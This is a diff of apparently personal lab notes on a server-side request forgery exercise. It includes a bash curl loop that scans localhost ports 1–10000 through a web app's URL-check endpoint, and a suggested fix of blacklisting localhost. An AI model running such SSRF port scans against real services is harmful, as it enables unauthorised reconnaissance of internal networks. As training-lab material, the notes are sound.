@@ -31,11 +31,10 @@ Add parser:
 Check for different ports on localhost:
 http://127.0.0.1:3306
 automated:
-for i in {1..1000} ; do curl -i -s -k  -X $'POST' \
-    -H $'Host: security:5000' -H $'Content-Type: multipart/form-data; boundary=---------------------------21378699481631318079639232504' -H $'Content-Length: 191' -H $'Connection: close' -H $'Referer: http://security:5000/' -H $'Upgrade-Insecure-Requests: 1' \
-    --data-binary $'-----------------------------21378699481631318079639232504\x0d\x0aContent-Disposition: form-data; name=\"url\"\x0d\x0a\x0d\x0ahttp://127.0.0.1:${i}\x0d\x0a-----------------------------21378699481631318079639232504--\x0d\x0a' \
-    $'http://security:5000/check_existence' |grep "reacheable" ; done ;
-TODO: automate to use $i correctly
+in burp right click request and copy as bash script, modify in loop to:
+for i in {1..10000} ; do echo $i; curl -i -s -k  -X $'POST' -F url=http://127.0.0.1:${i} $'http://security:5000/check_existence' |grep "is reach" ; done ;
+not very pretty but it works...
+-> other open port 5000
 ##Fix
 blacklist localhost, so it won't search in its own space
 
